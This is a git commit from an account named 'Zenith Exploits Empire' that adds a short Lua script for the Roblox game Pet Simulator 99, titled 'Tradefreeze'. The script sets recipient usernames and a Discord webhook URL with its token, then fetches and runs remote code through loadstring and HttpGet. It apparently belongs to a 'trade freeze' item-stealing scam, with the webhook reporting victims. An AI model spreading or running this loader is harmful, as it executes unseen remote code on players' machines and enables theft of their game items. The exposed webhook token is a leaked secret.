69602c15f741580cabe84e340109334d8cb21240
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 21:27:16 +0200

    Add generated script

---
+++ ps99/Tradefreeze.lua
@@ -0,0 +1,5 @@
+Username = "m1234ao"
+Username2 = "m1234ao"
+Webhook = "https://canary.discord.com/api/webhooks/1362865408612372862/sfx1Zz9vW1KXyrDiAPEbA_wBTktYUKdW_WKvX2_9cmUQrQLWQF4RoaWCaQOjrJJrSWGh"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
